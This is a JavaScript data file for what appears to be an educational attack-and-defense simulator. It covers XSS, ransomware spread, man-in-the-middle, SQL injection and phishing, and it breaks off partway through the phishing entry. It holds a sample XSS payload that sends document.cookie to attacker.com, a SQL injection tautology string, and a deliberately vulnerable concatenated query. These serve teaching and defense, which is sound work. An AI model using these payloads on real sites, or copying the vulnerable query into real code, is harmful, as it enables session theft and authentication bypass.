import {
  Code,
  Lock,
  Share2,
  Database,
  Mail,
  Flame,
  User,
  Monitor,
  Server,
  HardDrive,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Globe,
  Key,
  Bot,
  AlertTriangle,
  FileCode,
  Network
} from 'lucide-react';

export const SIMULATION_ATTACKS = {
  xss: {
    id: 'xss',
    title: 'Cross-Site Scripting (XSS)',
    shortName: 'XSS Scripting',
    severity: 'HIGH',
    icon: Code,
    category: 'Application Layer Injection',

    // Section A: What is this attack?
    whatIsThis: {
      summary:
        'Cross-Site Scripting (XSS) occurs when an attacker tricks a web application into including untrusted, malicious JavaScript in a webpage served to other users.',
      example:
        'A user posts a comment containing `<script>fetch("https://attacker.com/steal?cookie=" + document.cookie)</script>` into an unprotected forum.',
      impact:
        'When other users visit that page, the malicious script automatically runs in their browsers, allowing attackers to steal session cookies, hijack accounts, or deface websites.'
    },

    // Diagram Layout (Clean 2D Network Grid, 0-100% relative coordinates)
    nodes: [
      {
        id: 'attacker',
        label: 'Attacker Machine',
        role: 'Threat Actor',
        icon: Bot,
        type: 'attacker',
        x: 10,
        y: 50,
        desc: 'Adversary crafting malicious payload with stolen cookie receiver'
      },
      {
        id: 'inputForm',
        label: 'Form Input / HTTP POST',
        role: 'Data Transmission',
        icon: FileCode,
        type: 'network',
        x: 30,
        y: 50,
        desc: 'Unsanitized user comment containing embedded JavaScript snippet'
      },
      {
        id: 'webapp',
        label: 'Web Application Server',
        role: 'Backend Host',
        icon: Server,
        type: 'server',
        x: 50,
        y: 50,
        desc: 'Processes incoming HTTP requests and renders dynamic HTML to visitors'
      },
      {
        id: 'securityPolicy',
        label: 'Security & CSP Engine',
        role: 'Inspection Layer',
        icon: Shield,
        type: 'security',
        x: 70,
        y: 50,
        desc: 'AdaptiveShield payload scanner & Content Security Policy (CSP) header generator'
      },
      {
        id: 'victimBrowser',
        label: "User's Browser",
        role: 'Client Endpoint',
        icon: Monitor,
        type: 'client',
        x: 90,
        y: 50,
        desc: 'Legitimate visitor browsing the web application and executing client-side DOM'
      }
    ],

    connections: [
      {
        id: 'c1',
        from: 'attacker',
        to: 'inputForm',
        label: 'Malicious Payload',
        type: 'malicious',
        desc: 'Submits <script> payload via comment field input'
      },
      {
        id: 'c2',
        from: 'inputForm',
        to: 'webapp',
        label: 'HTTP Request',
        type: 'warning',
        desc: 'Transmits unencoded form payload to the web server'
      },
      {
        id: 'c3',
        from: 'webapp',
        to: 'securityPolicy',
        label: 'Security Inspection',
        type: 'normal',
        desc: 'Evaluates payload against XSS signatures and applies CSP rules'
      },
      {
        id: 'c4',
        from: 'securityPolicy',
        to: 'victimBrowser',
        label: 'HTML Response',
        type: 'conditional',
        desc: 'Sends rendered page to client browser (sanitized vs. raw payload)'
      }
    ],

    // Section C: Step-by-Step Simulation
    steps: [
      {
        stepNumber: 1,
        title: 'Attacker crafts malicious script',
        activeNode: 'attacker',
        activeConnection: 'c1',
        description:
          'The attacker crafts an exploit string containing JavaScript `<script>stealCookies()</script>` disguised as a regular user comment.',
        defenseExplanation:
          'The attack is currently at the adversary endpoint. No server or client security controls have encountered the payload yet.',
        statusText: 'Payload prepared at attacker machine',
        nodeStatus: { attacker: 'active', inputForm: 'normal', webapp: 'normal', securityPolicy: 'normal', victimBrowser: 'normal' }
      },
      {
        stepNumber: 2,
        title: 'Payload submitted through web form',
        activeNode: 'inputForm',
        activeConnection: 'c2',
        description:
          'The payload is sent across the network via an HTTP POST request to the web application server.',
        defenseExplanation:
          'Network transport carries the raw string. Vulnerable applications without perimeter firewalls accept the parameter directly into memory or storage.',
        statusText: 'Form input traveling to web server',
        nodeStatus: { attacker: 'normal', inputForm: 'active', webapp: 'normal', securityPolicy: 'normal', victimBrowser: 'normal' }
      },
      {
        stepNumber: 3,
        title: 'Web server processes the input',
        activeNode: 'webapp',
        activeConnection: 'c3',
        description:
          'The web application receives the comment and passes it to the security and rendering subsystem.',
        defenseExplanation:
          'If the server lacks context-aware HTML entity encoding, the script tags remain executable syntax rather than harmless text.',
        statusText: 'Server receiving input parameter',
        nodeStatus: { attacker: 'normal', inputForm: 'normal', webapp: 'active', securityPolicy: 'normal', victimBrowser: 'normal' }
      },
      {
        stepNumber: 4,
        title: 'Input handling and browser policy inspection',
        activeNode: 'securityPolicy',
        activeConnection: 'c4',
        description:
          'AdaptiveShield evaluates the incoming data against known XSS heuristic signatures and configures browser security headers.',
        defenseExplanation:
          'With Defense ON: AdaptiveShield Stage 4 DPI matches SIG-XSS, blocking the injection, while strict Content Security Policy (CSP) headers `script-src \'self\'` are enforced to reject untrusted inline scripts.\nWith Defense OFF: Unchecked input is written directly into the HTML response without any protective CSP headers.',
        statusText: 'Security controls evaluating payload',
        nodeStatus: { attacker: 'normal', inputForm: 'normal', webapp: 'normal', securityPolicy: 'active', victimBrowser: 'normal' }
      },
      {
        stepNumber: 5,
        title: 'Webpage renders in user browser',
        activeNode: 'victimBrowser',
        activeConnection: 'c4',
        description:
          'A legitimate user visits the website and their browser receives and parses the HTML response.',
        defenseExplanation:
          'With Defense ON: The browser treats the comment as safe plain text (`&lt;script&gt;`). Even if an inline script somehow reached the page, CSP would strictly forbid it from executing. The user is safe.\nWith Defense OFF: The user\'s browser parses the raw `<script>` tag and executes it automatically. The script reads the victim\'s session token and sends it to the attacker!',
        statusText: 'Page rendering completed in user browser',
        nodeStatus: { attacker: 'normal', inputForm: 'normal', webapp: 'normal', securityPolicy: 'normal', victimBrowser: 'active' }
      }
    ],

    // Section D: What did we learn?
    whatDidWeLearn: {
      attempted: 'The attacker attempted to inject arbitrary JavaScript to execute inside a visitor’s browser session.',
      stoppedBy: 'AdaptiveShield Stage 4 DPI signature detection combined with safe contextual HTML encoding and Content Security Policy (CSP).',
      assetProtected: 'User session cookies, account authentication tokens, and browser DOM integrity.',
      defenseDisabledOutcome: 'The victim’s browser would have executed the script, granting the attacker full unauthorized access to the victim’s account.',
      preventionMeasures: [
        'Always context-encode untrusted output (convert `<` to `&lt;`, `>` to `&gt;`) before writing it into HTML documents.',
        'Implement a strict Content Security Policy (CSP) header (`default-src \'self\'; script-src \'self\'`) to disallow unauthorized inline code.',
        'Store sensitive authentication tokens in `HttpOnly` and `SameSite` cookies so JavaScript cannot access them even if XSS occurs.'
      ],
      engineDistinction: 'Educational Simulation Note: This simulation illustrates browser DOM execution and header defense concepts. In the actual AdaptiveShield C++ engine, Stage 4 Deep Payload Inspection evaluates regex signatures on packet payloads.'
    }
  },

  ransomware: {
    id: 'ransomware',
    title: 'Ransomware Network Propagation',
    shortName: 'Ransomware Worm',
    severity: 'CRITICAL',
    icon: Lock,
    category: 'Malware & Lateral Movement',

    whatIsThis: {
      summary:
        'Ransomware is malicious software that encrypts files on a compromised computer and rapidly attempts lateral movement to infect other computers and shared servers across the internal network.',
      example:
        'An employee opens a malicious email invoice attachment that executes an encryptor and probes Port 445 (SMB) across the local office subnet.',
      impact:
        'Within minutes, internal file shares, enterprise application servers, and databases become encrypted and locked with a `.locked` extension, completely halting business operations.'
    },

    // Larger network diagram layout with all 9 devices
    nodes: [
      {
        id: 'attacker',
        label: 'Attacker (Threat Actor)',
        role: 'External Adversary',
        icon: Bot,
        type: 'attacker',
        x: 8,
        y: 20,
        desc: 'Adversary distributing initial ransomware loader via phishing email'
      },
      {
        id: 'infectedPc',
        label: 'Infected Computer (Patient 0)',
        role: 'Compromised Host',
        icon: Monitor,
        type: 'client',
        x: 29,
        y: 20,
        desc: 'Workstation running initial ransomware loader and probing for lateral targets'
      },
      {
        id: 'employeePc',
        label: 'Employee Workstation',
        role: 'Peer Workstation',
        icon: Monitor,
        type: 'client',
        x: 52,
        y: 20,
        desc: 'Uninfected peer employee desktop on the same office subnet'
      },
      {
        id: 'shieldIsolation',
        label: 'AdaptiveShield Isolation',
        role: 'Detection & Containment',
        icon: Shield,
        type: 'security',
        x: 78,
        y: 20,
        desc: 'Stage 2 Port Filter & Automated Zero-Trust Micro-Segmentation Agent'
      },
      {
        id: 'networkSwitch',
        label: 'Internal Network Switch',
        role: 'Core Subnet Hub',
        icon: Network,
        type: 'network',
        x: 50,
        y: 52,
        desc: 'Core gigabit switch routing packets between office workstations and servers'
      },
      {
        id: 'fileServer',
        label: 'File Server',
        role: 'Shared Storage (SMB)',
        icon: HardDrive,
        type: 'server',
        x: 18,
        y: 82,
        desc: 'Hosts shared company documents and department network drives on Port 445'
      },
      {
        id: 'appServer',
        label: 'Application Server',
        role: 'Business Portal',
        icon: Server,
        type: 'server',
        x: 39,
        y: 82,
        desc: 'Runs internal ERP, billing software, and API services'
      },
      {
        id: 'dbServer',
        label: 'Database Server',
        role: 'Core Data Store',
        icon: Database,
        type: 'server',
        x: 61,
        y: 82,
        desc: 'Stores customer records, financial ledgers, and transactions'
      },
      {
        id: 'backupServer',
        label: 'Backup Server',
        role: 'Immutable Storage',
        icon: Server,
        type: 'server',
        x: 82,
        y: 82,
        desc: 'Isolated backup repository holding encrypted snapshots of company data'
      }
    ],

    connections: [
      {
        id: 'c1',
        from: 'attacker',
        to: 'infectedPc',
        label: 'Phishing Loader',
        type: 'malicious',
        desc: 'Phishing email drops malicious executable payload onto Patient Zero'
      },
      {
        id: 'c2',
        from: 'infectedPc',
        to: 'employeePc',
        label: 'Peer Spread Probe',
        type: 'warning',
        desc: 'Infected computer attempts to connect to peer employee workstation'
      },
      {
        id: 'c3',
        from: 'infectedPc',
        to: 'networkSwitch',
        label: 'SMB / Port 445 Scan',
        type: 'warning',
        desc: 'Infected computer scans subnet switch ports to find lateral targets'
      },
      {
        id: 'c4',
        from: 'networkSwitch',
        to: 'shieldIsolation',
        label: 'Telemetry Mirror',
        type: 'normal',
        desc: 'Switch mirrors traffic to AdaptiveShield for rapid anomaly inspection'
      },
      {
        id: 'c5',
        from: 'networkSwitch',
        to: 'fileServer',
        label: 'SMB Lateral Spread',
        type: 'conditional',
        desc: 'Attempted network share access to encrypt shared corporate files'
      },
      {
        id: 'c6',
        from: 'networkSwitch',
        to: 'appServer',
        label: 'RDP Lateral Spread',
        type: 'conditional',
        desc: 'Attempted remote connection to seize application server'
      },
      {
        id: 'c7',
        from: 'networkSwitch',
        to: 'dbServer',
        label: 'DB Lateral Spread',
        type: 'conditional',
        desc: 'Attempted access to sensitive relational database records'
      },
      {
        id: 'c8',
        from: 'networkSwitch',
        to: 'backupServer',
        label: 'Isolated Backup Link',
        type: 'safe',
        desc: 'Read-only, air-gapped backup connection with strict access controls'
      }
    ],

    steps: [
      {
        stepNumber: 1,
        title: 'Initial infection of Patient Zero',
        activeNode: 'infectedPc',
        activeConnection: 'c1',
        description:
          'An unsuspecting user executes an infected attachment. The ransomware launches locally on Infected Computer (Patient 0) and begins encrypting user documents.',
        defenseExplanation:
          'Perimeter firewalls do not inspect internal local disk writes. The ransomware takes control of Patient 0.',
        statusText: 'Patient Zero endpoint infected with ransomware',
        nodeStatus: { attacker: 'active', infectedPc: 'compromised', employeePc: 'normal', shieldIsolation: 'normal', networkSwitch: 'normal', fileServer: 'normal', appServer: 'normal', dbServer: 'normal', backupServer: 'normal' }
      },
      {
        stepNumber: 2,
        title: 'Attempted connection to another machine',
        activeNode: 'infectedPc',
        activeConnection: 'c2',
        description:
          'Having compromised Patient 0, the malware immediately attempts a direct connection to a nearby Employee Workstation on the local network.',
        defenseExplanation:
          'Lateral movement begins: malware attempts to spread peer-to-peer across the office floor without needing human interaction.',
        statusText: 'Infected PC probing peer employee workstation',
        nodeStatus: { attacker: 'normal', infectedPc: 'compromised', employeePc: 'warning', shieldIsolation: 'normal', networkSwitch: 'normal', fileServer: 'normal', appServer: 'normal', dbServer: 'normal', backupServer: 'normal' }
      },
      {
        stepNumber: 3,
        title: 'Attempted lateral movement through network switch',
        activeNode: 'networkSwitch',
        activeConnection: 'c3',
        description:
          'The infected machine blasts thousands of Port 445 (SMB) connection requests into the Internal Network Switch, attempting to reach all enterprise servers.',
        defenseExplanation:
          'In an unprotected flat network, the switch blindly forwards these packets to every server on the subnet, allowing worm propagation.',
        statusText: 'Lateral spread packets entering network switch',
        nodeStatus: { attacker: 'normal', infectedPc: 'compromised', employeePc: 'normal', shieldIsolation: 'normal', networkSwitch: 'active', fileServer: 'warning', appServer: 'warning', dbServer: 'warning', backupServer: 'normal' }
      },
      {
        stepNumber: 4,
        title: 'Highlighting suspicious lateral activity',
        activeNode: 'shieldIsolation',
        activeConnection: 'c4',
        description:
          'AdaptiveShield monitors network switch traffic. It detects a rapid burst of unauthorized SMB connection attempts originating from Patient 0.',
        defenseExplanation:
          'AdaptiveShield Stage 2 (Port & Protocol Guard) flags disallowed lateral port activity (Port 445/3389) and triggers automated zero-trust host isolation.',
        statusText: 'Suspicious lateral activity flagged by AdaptiveShield',
        nodeStatus: { attacker: 'normal', infectedPc: 'compromised', employeePc: 'normal', shieldIsolation: 'active', networkSwitch: 'active', fileServer: 'normal', appServer: 'normal', dbServer: 'normal', backupServer: 'normal' }
      },
      {
        stepNumber: 5,
        title: 'Affected device quarantined by security control',
        activeNode: 'shieldIsolation',
        activeConnection: 'c4',
        description:
          'AdaptiveShield instructs the switch to sever the port connecting Patient 0.',
        defenseExplanation:
          'With Defense ON: Patient 0 is immediately quarantined. All incoming and outgoing network packets are blocked, preventing any malware packets from leaving the machine.\nWith Defense OFF: No quarantine occurs. Malicious worm traffic traverses the switch unrestricted.',
        statusText: 'Patient Zero quarantined: switch port severed',
        nodeStatus: { attacker: 'normal', infectedPc: 'quarantined', employeePc: 'protected', shieldIsolation: 'active', networkSwitch: 'normal', fileServer: 'protected', appServer: 'protected', dbServer: 'protected', backupServer: 'protected' }
      },
      {
        stepNumber: 6,
        title: 'Network devices remain protected',
        activeNode: 'networkSwitch',
        activeConnection: 'c5',
        description:
          'Evaluation of remaining infrastructure health across all connected machines.',
        defenseExplanation:
          'With Defense ON: Patient 0 is isolated. Peer Employee Workstation, File Server, Application Server, Database Server, and Backup Server remain 100% safe and unaffected!\nWith Defense OFF: The entire subnet is encrypted. Files across all servers are locked with .locked extensions.',
        statusText: 'Enterprise network servers protected',
        nodeStatus: { attacker: 'normal', infectedPc: 'quarantined', employeePc: 'protected', shieldIsolation: 'normal', networkSwitch: 'normal', fileServer: 'protected', appServer: 'protected', dbServer: 'protected', backupServer: 'protected' }
      }
    ],

    whatDidWeLearn: {
      attempted: 'The ransomware attempted lateral movement across the internal network to encrypt central enterprise servers.',
      stoppedBy: 'AdaptiveShield Stage 2 Port filtering and automated zero-trust host quarantine at the network switch layer.',
      assetProtected: 'Corporate File Server, ERP Application Server, Customer Database, and Backup Archives.',
      defenseDisabledOutcome: 'Every server on the flat subnet would have had its files encrypted, resulting in catastrophic operational paralysis.',
      preventionMeasures: [
        'Enforce network micro-segmentation: workstations should never communicate directly with other workstations or administrative server ports without an inspection gateway.',
        'IMPORTANT: Quarantining a machine stops network spread, but it does NOT decrypt files or remove malware already written to that machine. Infected devices must be cleanly wiped and restored from backups.',
        'Maintain immutable, air-gapped backups that are physically or cryptographically separated from the main corporate network.'
      ],
      engineDistinction: 'Educational Simulation Note: This network simulation demonstrates lateral movement containment. In the actual AdaptiveShield C++ engine, Stage 2 enforces Port/Protocol ACLs (blocking ports 445/3389) and Stage 5 evaluates IP auto-bans.'
    }
  },

  mitm: {
    id: 'mitm',
    title: 'Man-in-the-Middle (MitM) Eavesdropping',
    shortName: 'MitM Proxy',
    severity: 'HIGH',
    icon: Share2,
    category: 'Network Interception & Spoofing',

    whatIsThis: {
      summary:
        'A Man-in-the-Middle (MitM) attack occurs when an adversary secretly positions themselves between a client and a destination server to intercept, inspect, or modify communication in transit.',
      example:
        'On an open coffee shop Wi-Fi network, an attacker runs ARP spoofing to route a banking client’s traffic through a rogue proxy machine.',
      impact:
        'If the connection lacks strict encryption and certificate validation, the attacker can steal passwords, hijack active login sessions, or secretly alter bank transfer amounts.'
    },

    nodes: [
      {
        id: 'clientPc',
        label: 'Client Computer',
        role: 'Banking Customer',
        icon: Monitor,
        type: 'client',
        x: 10,
        y: 50,
        desc: 'Legitimate customer initiating an online bank transfer of $500'
      },
      {
        id: 'localNetwork',
        label: 'Local Network / Gateway',
        role: 'Local Wi-Fi Router',
        icon: Network,
        type: 'network',
        x: 30,
        y: 50,
        desc: 'Wireless access point routing packets toward the public internet'
      },
      {
        id: 'interceptor',
        label: 'Adversary Rogue Proxy',
        role: 'Interception Node',
        icon: Bot,
        type: 'attacker',
        x: 50,
        y: 20,
        desc: 'Attacker machine executing ARP poisoning to intercept unencrypted traffic'
      },
      {
        id: 'tlsValidator',
        label: 'TLS & Certificate Validator',
        role: 'Security Verification',
        icon: Shield,
        type: 'security',
        x: 70,
        y: 50,
        desc: 'AdaptiveShield & client browser validating cryptographic digital certificates'
      },
      {
        id: 'bankServer',
        label: 'Destination Bank Server',
        role: 'Financial API Gateway',
        icon: Server,
        type: 'server',
        x: 90,
        y: 50,
        desc: 'Legitimate banking server receiving verified financial transactions'
      }
    ],

    connections: [
      {
        id: 'c1',
        from: 'clientPc',
        to: 'localNetwork',
        label: 'Transfer Request',
        type: 'normal',
        desc: 'Customer submits a $500 transfer request to their bank'
      },
      {
        id: 'c2',
        from: 'localNetwork',
        to: 'interceptor',
        label: 'Poisoned Route',
        type: 'warning',
        desc: 'ARP spoofing forces the packet toward the attacker’s machine'
      },
      {
        id: 'c3',
        from: 'localNetwork',
        to: 'tlsValidator',
        label: 'Direct TLS Tunnel',
        type: 'safe',
        desc: 'Direct authenticated TLS 1.3 encrypted pathway bypassing interceptor'
      },
      {
        id: 'c4',
        from: 'interceptor',
        to: 'tlsValidator',
        label: 'Tampered Traffic',
        type: 'malicious',
        desc: 'Attacker attempts to alter the packet and retransmit to server'
      },
      {
        id: 'c5',
        from: 'tlsValidator',
        to: 'bankServer',
        label: 'Verified Payload',
        type: 'conditional',
        desc: 'Connection to destination bank server (verified vs. rejected)'
      }
    ],

    steps: [
      {
        stepNumber: 1,
        title: 'Client initiates banking transaction',
        activeNode: 'clientPc',
        activeConnection: 'c1',
        description:
          'A customer on a local network opens their banking portal and initiates an authorization request to transfer $500 to a vendor.',
        defenseExplanation:
          'The client prepares the request. In a secure setup, the client specifies HTTPS (TLS encryption) with HTTP Strict Transport Security (HSTS).',
        statusText: 'Client creating financial transaction request',
        nodeStatus: { clientPc: 'active', localNetwork: 'normal', interceptor: 'normal', tlsValidator: 'normal', bankServer: 'normal' }
      },
      {
        stepNumber: 2,
        title: 'Packet travels across local network gateway',
        activeNode: 'localNetwork',
        activeConnection: 'c1',
        description:
          'The packet leaves the client and arrives at the local network switch or Wi-Fi router for transmission.',
        defenseExplanation:
          'Local networks are inherently shared mediums. Any device on the same local network can broadcast spoofed ARP responses.',
        statusText: 'Packet traversing local network segment',
        nodeStatus: { clientPc: 'normal', localNetwork: 'active', interceptor: 'normal', tlsValidator: 'normal', bankServer: 'normal' }
      },
      {
        stepNumber: 3,
        title: 'Attacker attempts interception and payload tampering',
        activeNode: 'interceptor',
        activeConnection: 'c2',
        description:
          'An attacker on the same network uses ARP spoofing to trick the gateway into diverting the client’s packets into their rogue proxy machine.',
        defenseExplanation:
          'With Defense ON: The client’s connection is encrypted end-to-end via TLS 1.3. The attacker sees only indecipherable ciphertext and cannot read or modify the payload.\nWith Defense OFF: Unencrypted plaintext traffic is exposed. The attacker reads the transfer and alters `$500` to `$5,000` with their own account number!',
        statusText: 'Interception attempt at rogue proxy node',
        nodeStatus: { clientPc: 'normal', localNetwork: 'normal', interceptor: 'active', tlsValidator: 'normal', bankServer: 'normal' }
      },
      {
        stepNumber: 4,
        title: 'Secure connection & certificate validation',
        activeNode: 'tlsValidator',
        activeConnection: 'c4',
        description:
          'The connection reaches the security verification layer where cryptographic certificates and digital signatures are inspected.',
        defenseExplanation:
          'With Defense ON: If the attacker tries to act as a proxy by offering a fake digital certificate, the client and AdaptiveShield detect the forged certificate authority and terminate the connection with a "Connection Untrusted" warning.\nWith Defense OFF: The client ignores certificate warnings, trusting the attacker’s fake certificate, allowing the modified packet through.',
        statusText: 'Verifying TLS certificate integrity',
        nodeStatus: { clientPc: 'normal', localNetwork: 'normal', interceptor: 'normal', tlsValidator: 'active', bankServer: 'normal' }
      },
      {
        stepNumber: 5,
        title: 'Destination bank server receives decision',
        activeNode: 'bankServer',
        activeConnection: 'c5',
        description:
          'The bank server receives the final communication or the connection is terminated safely before any sensitive data is exposed.',
        defenseExplanation:
          'With Defense ON: The bank verifies the authentic TLS session. The untrusted proxy connection was aborted. The customer’s money and credentials remain 100% safe.\nWith Defense OFF: The bank executes the tampered `$5,000` transfer submitted by the attacker!',
        statusText: 'Transaction outcome finalized at bank server',
        nodeStatus: { clientPc: 'normal', localNetwork: 'normal', interceptor: 'normal', tlsValidator: 'normal', bankServer: 'active' }
      }
    ],

    whatDidWeLearn: {
      attempted: 'The attacker attempted to secretly intercept the client’s traffic, read sensitive data, and tamper with transaction parameters.',
      stoppedBy: 'End-to-end TLS 1.3 encryption combined with strict digital certificate validation and HSTS enforcement.',
      assetProtected: 'Financial transaction integrity, account credentials, and session authentication tokens.',
      defenseDisabledOutcome: 'Plaintext data would be stolen and the transfer amount tampered from $500 to $5,000 without the user’s consent.',
      preventionMeasures: [
        'Always enforce HTTPS with HTTP Strict Transport Security (HSTS) headers so browsers never attempt unencrypted fallback connections.',
        'Never ignore browser certificate warnings (such as "Your connection is not private") — this is often the only visible symptom of an active MitM attack.',
        'IMPORTANT: Do not assume encryption alone prevents every interception attack! If an attacker installs a malicious root certificate on a victim computer or compromises DNS, they may still bypass standard protections.'
      ],
      engineDistinction: 'Educational Simulation Note: This simulation illustrates TLS handshake and certificate validation concepts. In the AdaptiveShield C++ engine, Stage 2 guards protocol rules and Stage 1 enforces IP allow/deny policies.'
    }
  },

  sqli: {
    id: 'sqli',
    title: 'SQL Injection (SQLi)',
    shortName: 'SQL Injection',
    severity: 'CRITICAL',
    icon: Database,
    category: 'Database Query Manipulation',

    whatIsThis: {
      summary:
        'SQL Injection occurs when untrusted user input is directly concatenated into a dynamic database query, allowing an attacker to manipulate the query’s structure and execution logic.',
      example:
        "Entering `admin' OR '1'='1` into a login form username field transforms the SQL condition so that it always evaluates to TRUE.",
      impact:
        'Attackers can bypass authentication passwords, view secret customer data, modify or delete database tables, and in some cases execute administrative commands on the database server.'
    },

    nodes: [
      {
        id: 'userForm',
        label: 'User / Login Form',
        role: 'Input Interface',
        icon: User,
        type: 'client',
        x: 12,
        y: 50,
        desc: 'Login input form accepting username and password credentials'
      },
      {
        id: 'webServer',
        label: 'Web Application Server',
        role: 'Query Builder',
        icon: Server,
        type: 'server',
        x: 38,
        y: 50,
        desc: 'Backend service (Node/Python/PHP) assembling the database command'
      },
      {
        id: 'inspectionLayer',
        label: 'Inspection & Parameterization',
        role: 'Security Gate',
        icon: Shield,
        type: 'security',
        x: 64,
        y: 50,
        desc: 'AdaptiveShield Stage 4 DPI scanner & Parameterized Prepared Statements'
      },
      {
        id: 'database',
        label: 'Relational SQL Database',
        role: 'Target Data Store',
        icon: Database,
        type: 'server',
        x: 88,
        y: 50,
        desc: 'SQL database engine (PostgreSQL/MySQL/SQLite) executing queries'
      }
    ],

    connections: [
      {
        id: 'c1',
        from: 'userForm',
        to: 'webServer',
        label: 'Tautology Input',
        type: 'malicious',
        desc: "Submits suspicious input string: admin' OR '1'='1 --"
      },
      {
        id: 'c2',
        from: 'webServer',
        to: 'inspectionLayer',
        label: 'Query Construction',
        type: 'warning',
        desc: 'Transmits query for parameterization and deep inspection'
      },
      {
        id: 'c3',
        from: 'inspectionLayer',
        to: 'database',
        label: 'SQL Execution',
        type: 'conditional',
        desc: 'Dispatches safe parameterized query vs. dangerous concatenated SQL'
      }
    ],

    steps: [
      {
        stepNumber: 1,
        title: 'Attacker inputs harmless-looking SQL tautology',
        activeNode: 'userForm',
        activeConnection: 'c1',
        description:
          "The attacker enters a classic tautology payload `admin' OR '1'='1 --` into the username box and leaves the password field blank.",
        defenseExplanation:
          'A tautology is a statement that is always true in mathematical logic. The attacker uses single quotes to break out of the intended data field and comments out the password check.',
        statusText: 'Payload entered into login form',
        nodeStatus: { userForm: 'active', webServer: 'normal', inspectionLayer: 'normal', database: 'normal' }
      },
      {
        stepNumber: 2,
        title: 'Web server receives the input parameter',
        activeNode: 'webServer',
        activeConnection: 'c1',
        description:
          'The web application receives the HTTP POST request and prepares to look up the user credentials in the database.',
        defenseExplanation:
          'In poorly designed code, the developer writes: `query = "SELECT * FROM users WHERE user = \'" + input + "\' AND pass = \'" + pass + "\'"`. This allows input to alter the SQL syntax itself.',
        statusText: 'Server receiving input string',
        nodeStatus: { userForm: 'normal', webServer: 'active', inspectionLayer: 'normal', database: 'normal' }
      },
      {
        stepNumber: 3,
        title: 'Input inspection and query parameterization',
        activeNode: 'inspectionLayer',
        activeConnection: 'c2',
        description:
          'The input is evaluated by security controls before execution.',
        defenseExplanation:
          'With Defense ON: AdaptiveShield Stage 4 DPI scans the payload and matches `SIG-SQLI` (`OR \'1\'=\'1\'`). In addition, the backend utilizes Parameterized Queries (`SELECT * FROM users WHERE user = ?`), treating the input strictly as literal string data rather than executable SQL syntax.\nWith Defense OFF: No inspection occurs. The raw SQL string is concatenated directly.',
        statusText: 'Evaluating query construction method',
        nodeStatus: { userForm: 'normal', webServer: 'normal', inspectionLayer: 'active', database: 'normal' }
      },
      {
        stepNumber: 4,
        title: 'Database engine processes query',
        activeNode: 'database',
        activeConnection: 'c3',
        description:
          'The SQL query is executed by the relational database engine.',
        defenseExplanation:
          'With Defense ON: The database searches for a literal username named `"admin\' OR \'1\'=\'1 --"`. No user matches this literal string, and authentication is safely denied.\nWith Defense OFF: The database interprets `WHERE user = \'admin\' OR \'1\'=\'1\'`. Because \'1\'=\'1\' is always TRUE, the database returns all user rows without checking any password!',
        statusText: 'Database executing query evaluation',
        nodeStatus: { userForm: 'normal', webServer: 'normal', inspectionLayer: 'normal', database: 'active' }
      },
      {
        stepNumber: 5,
        title: 'Authentication result and data protection',
        activeNode: 'database',
        activeConnection: 'c3',
        description:
          'The web application receives the database output and determines whether access is granted.',
        defenseExplanation:
          'With Defense ON: Access is rejected. Zero data is leaked. The database remains completely secure.\nWith Defense OFF: The attacker is instantly logged in as the Administrator, and can dump user passwords, credit card records, or employee tables.',
        statusText: 'Final query verdict produced',
        nodeStatus: { userForm: 'normal', webServer: 'normal', inspectionLayer: 'normal', database: 'active' }
      }
    ],

    whatDidWeLearn: {
      attempted: 'The attacker attempted to modify the syntax of an internal database query to bypass password authentication.',
      stoppedBy: 'Parameterized queries (Prepared Statements) enforced at the code layer and AdaptiveShield Stage 4 DPI regex filtering at the network layer.',
      assetProtected: 'Entire relational database: customer records, user tables, and authentication hashes.',
      defenseDisabledOutcome: 'Authentication was bypassed entirely, granting administrative control over the company database.',
      preventionMeasures: [
        'Always use Parameterized Queries (Prepared Statements) or an ORM — this cleanly separates SQL code from user-supplied data.',
        'IMPORTANT: Do not claim that input filtering or WAF regex alone is a complete SQL injection defense. A WAF provides vital defense-in-depth, but parameterized queries are the foundational software fix.',
        'Apply the principle of least privilege: the database user account used by the web app should not have permissions to DROP tables or read administrative schemas.'
      ],
      engineDistinction: 'Educational Simulation Note: This simulation illustrates SQL syntax tampering vs parameterization. In the actual AdaptiveShield C++ engine, Stage 4 Deep Payload Inspection runs compiled regex rules (such as SIG-SQLI) against incoming packet payloads.'
    }
  },

  phishing: {
    id: 'phishing',
    title: 'Phishing and Social Engineering',
    shortName: 'Phishing Probe',
    severity: 'HIGH',
    icon: Mail,
    category: 'Credential Harvesting & Deception',

    whatIsThis: {
      summary:
        'Phishing is a social engineering attack where an adversary masquerades as a trusted entity (such as IT support or a bank) to deceive employees into disclosing confidential credentials or clicking malicious links.',
      example:
        'An email arrives claiming: "Urgent: Your password expires in 1 hour. Click here to verify your account" linking to a lookalike domain `login-m1crosoft.co`.',
      impact:
        'Once the victim enters their username and password into the fake portal, the attacker captures the credentials and initiates unauthorized account takeovers.'
    },

    nodes: [
      {
        id: 'attacker',
        label: 'Attacker / Scammer',
        role: 'Deceptive Sender',
        icon: Bot,
        type: 'attacker',
        x: 10,
        y: 50,
        desc: 'Adversary hosting cloned corporate login page and mass-sending spoofed lures'
      },
      {
        id: 'emailGateway',
        label: 'Secure Email Gateway',
        role: 'DMARC / SPF Filter',
        icon: Shield,
        type: 'security',
        x: 30,
        y: 50,
        desc: 'Inspects sender headers, domain reputation, and SPF/DKIM authentication'
      },
      {
        id: 'employeeInbox',
        label: 'Employee Inbox',
        role: 'Victim Interface',
        icon: User,
        type: 'client',
        x: 50,
        y: 50,
        desc: 'Corporate user receiving daily emails on their workstation'
      },
      {
        id: 'fakeWebsite',
        label: 'Cloned Phishing Site',
        role: 'Deceptive Portal',
        icon: Globe,
        type: 'attacker',
        x: 70,
        y: 50,
        desc: 'Fake login page at lookalike domain designed to harvest credentials'
      },
      {
        id: 'credShield',
        label: 'Credential Protection / FIDO2',
        role: 'Hardware Security Layer',
        icon: Key,
        type: 'security',
        x: 90,
        y: 50,
        desc: 'AdaptiveShield browser extension, password manager domain check & FIDO2 WebAuthn'
      }
    ],

    connections: [
      {
        id: 'c1',
        from: 'attacker',
        to: 'emailGateway',
        label: 'Spoofed Lure Email',
        type: 'malicious',
        desc: 'Sends fake urgent password-reset notice from spoofed address'
      },
      {
        id: 'c2',
        from: 'emailGateway',
        to: 'employeeInbox',
        label: 'Delivered Email',
        type: 'warning',
        desc: 'Email routed into user inbox (with or without warning banners)'
      },
      {
        id: 'c3',
        from: 'employeeInbox',
        to: 'fakeWebsite',
        label: 'Deceptive Link Click',
        type: 'malicious',
        desc: 'Employee clicks suspicious link pointing to cloned domain'
      },
      {
        id: 'c4',
